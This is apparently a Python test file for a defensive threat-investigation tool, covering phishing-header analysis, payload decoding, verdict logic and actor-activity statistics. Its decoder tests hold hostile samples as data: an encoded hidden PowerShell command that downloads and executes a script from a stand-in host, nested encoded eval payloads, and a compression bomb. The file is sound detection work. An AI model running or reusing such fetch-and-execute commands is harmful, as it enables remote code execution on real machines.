"""Investigation tools: header analysis, payload decoding, verdicts."""
import base64
import gzip

from app.api.tools import _verdict
from app.tools.decoder import decode
from app.tools.headers import analyse

PHISH = """Received: from mail.attacker-host.example (unknown [185.220.101.4])
\tby mx.victim.co.ke (Postfix) with ESMTP id 1234; Mon, 26 Oct 2026 10:00:05 +0300
Received: from [10.0.0.5] (helo=localhost) by mail.attacker-host.example with SMTP; Mon, 26 Oct 2026 09:59:58 +0300
Authentication-Results: mx.victim.co.ke; spf=softfail smtp.mailfrom=attacker-host.example; dkim=none; dmarc=fail header.from=kcb.co.ke
Return-Path: <bounce@attacker-host.example>
From: "KCB Security security@kcb.co.ke" <alerts@kcb-secure-login.example>
Reply-To: help@gmail.com
To: victim@victim.co.ke
Subject: Verify your account
Message-ID: <abc@attacker-host.example>
Date: Mon, 26 Oct 2026 09:59:50 +0300

Body text is ignored.
"""


def test_header_analysis_finds_origin_auth_and_spoofing():
    r = analyse(PHISH)
    assert r["ok"] and r["origin"]["ip"] == "185.220.101.4"  # the private 10.0.0.5 hop is skipped
    assert r["auth"]["dmarc"] == {"result": "fail", "domain": "kcb.co.ke"} and r["auth"]["spf"]["result"] == "softfail"
    titles = {w["title"] for w in r["warnings"]}
    assert {"Replies go to another domain", "Display name shows a different address", "DMARC fail"} <= titles
    assert [h["by"] for h in r["hops"]] == ["mail.attacker-host.example", "mx.victim.co.ke"]
    assert r["hops"][1]["delay_seconds"] == 7
    assert "Body text" not in str(r)


def test_header_analysis_rejects_non_headers():
    assert not analyse("hello there")["ok"]


def test_clean_mail_raises_no_alarm():
    r = analyse("From: Alice <alice@example.com>\nReturn-Path: <alice@example.com>\n"
                "Authentication-Results: mx.example.net; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com\n"
                "DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=s1; b=abc\nMessage-ID: <1@example.com>\nSubject: hi\n")
    assert r["ok"] and r["warnings"] == []


def test_decoder_peels_powershell_and_finds_behaviour():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil-update.example.net/a.ps1')"
    r = decode("powershell -nop -w hidden -enc " + base64.b64encode(inner.encode("utf-16-le")).decode())
    assert r["decoded"] and r["final"] == inner
    assert {"download", "execute", "defence_evasion"} <= {b["key"] for b in r["behaviours"]}
    assert {"type": "url", "value": "http://evil-update.example.net/a.ps1"} in r["indicators"]


def test_decoder_nested_layers_and_encodings():
    gz = base64.b64encode(gzip.compress(b"var u='https://bad.example.org/x';eval(atob('YWxlcnQoMSk='))")).decode()
    r = decode(f"$s=[System.Convert]::FromBase64String('{gz}');")
    assert "alert(1)" in r["final"] and "https://bad.example.org/x" in r["final"]
    assert decode("68747470733a2f2f6576696c2e6578616d706c652e636f6d")["final"] == "https://evil.example.com"
    assert "phish.example.com" in decode("eval(String.fromCharCode(104,116,116,112,58,47,47,112,104,105,115,104,46,101,120,97,109,112,108,101,46,99,111,109))")["final"]
    assert decode("%68%74%74%70%3A%2F%2Fx.example.com%2Fa")["final"] == "http://x.example.com/a"
    assert decode("a normal sentence, nothing encoded")["decoded"] is False


def test_decoder_survives_a_compression_bomb():
    r = decode(base64.b64encode(gzip.compress(b"A" * 50_000_000)).decode())
    assert max(layer["length"] for layer in r["layers"]) <= 2_000_000 and len(r["layers"]) == 2


def test_verdict_combination():
    ok = lambda label, v: {"label": label, "ok": True, "verdict": v}
    assert _verdict(["feodo"], False, [], 0)[0] == "malicious"
    assert _verdict([], False, [ok("VirusTotal", "malicious")], 0)[0] == "malicious"
    assert _verdict([], False, [ok("GreyNoise", "suspicious")], 0)[0] == "suspicious"
    assert _verdict([], False, [], 3)[0] == "seen"
    assert _verdict([], False, [ok("InternetDB", "clean")], 0)[0] == "clean"
    assert _verdict([], True, [ok("x", "suspicious")], 2)[0] == "benign"
    assert _verdict([], False, [], 0) == ("unknown", ["Nothing known about it yet"])


def test_timeline_links_chain_in_time_order():
    from app.api.timeline import COMMON_PLATFORMS, _chain

    when = {"a": "2026-10-03", "b": "2026-10-01", "c": "2026-10-02"}
    # Joined oldest to newest, one line per step, not every pair.
    assert _chain(["a", "b", "c", "a"], when) == [("b", "c"), ("c", "a")]
    assert _chain(["a"], when) == []
    assert "github.com" in COMMON_PLATFORMS and "cisa.gov" in COMMON_PLATFORMS


def test_actor_patterns_summary():
    from datetime import datetime, timezone

    from app.api.patterns import summarise

    now = datetime(2026, 10, 30, 12, tzinfo=timezone.utc)
    d = lambda day, month=10: datetime(2026, month, day, 9, tzinfo=timezone.utc)  # noqa: E731
    claims = [(d(5, 9), ["US"], ["Healthcare"]), (d(1), ["US"], ["Healthcare"]), (d(2), ["DE"], ["Education"]),
              (d(2), ["US"], ["Healthcare"]), (d(28), ["KE"], ["Finance"]), (None, [], [])]
    r = summarise(claims, now)
    assert r["claims"] == 6 and r["dated"] == 5
    assert r["last_30_days"] == 4 and r["previous_30_days"] == 1
    # 1 Oct 2026 is a Thursday, 2 Oct (twice) a Friday, 28 Oct a Wednesday, 5 Sep a Saturday.
    assert [w["count"] for w in r["weekdays"]] == [0, 0, 1, 1, 2, 1, 0]
    oct_ = next(m for m in r["monthly"] if m["month"] == "2026-10")
    assert oct_["claims"] == 4 and set(oct_["new_sectors"]) == {"Education", "Finance"}  # Healthcare was seen in September
    assert {c["code"] for c in oct_["new_countries"]} == {"DE", "KE"}
    sep = next(m for m in r["monthly"] if m["month"] == "2026-09")
    assert sep["new_sectors"] == []  # the first month in view has nothing to be new against
    # Without coverage data every day counts: the window opens on 3 May, and 3 May - 4 Sep had no claim.
    assert r["longest_quiet_days"] == 125

    # Kivuli collected 1-5 and 26-30 Oct only: the silence in between is a collection gap, not the actor.
    covered = {datetime(2026, 10, n).date() for n in (*range(1, 6), *range(26, 31))}
    r = summarise(claims, now, covered)
    assert r["longest_quiet_days"] == 3  # 3-5 Oct, then 26-27 Oct; the gap 6-25 Oct ends each run
    assert r["uncollected_days"] == 20 and r["median_gap_days"] == 1  # the 2 -> 28 Oct gap spans uncollected days


def test_source_value_ranks_relevant_referenced_live_sites_first():
    from datetime import datetime, timedelta, timezone

    from app.intel.source_value import score

    now = datetime(2026, 10, 31, tzinfo=timezone.utc)
    leak = score(relevance=8, references=6, findings=40, category="ransomware_leak_site", last_changed=now - timedelta(days=2),
                 is_live=True, failures=0, now=now)
    dead_shop = score(relevance=1, references=0, findings=0, category="other", last_changed=None, is_live=False, failures=5, now=now)
    fresh_candidate = score(relevance=6, references=3, findings=0, category="forum", last_changed=None, is_live=None, failures=0, now=now)
    assert leak[0] > fresh_candidate[0] > dead_shop[0]
    assert leak[0] <= 100 and dead_shop[0] == 3  # only its relevance counts
    assert leak[1][0]["points"] >= leak[1][-1]["points"]  # reasons, largest first
    assert any("Linked from 3 other sites" == f["label"] for f in fresh_candidate[1])
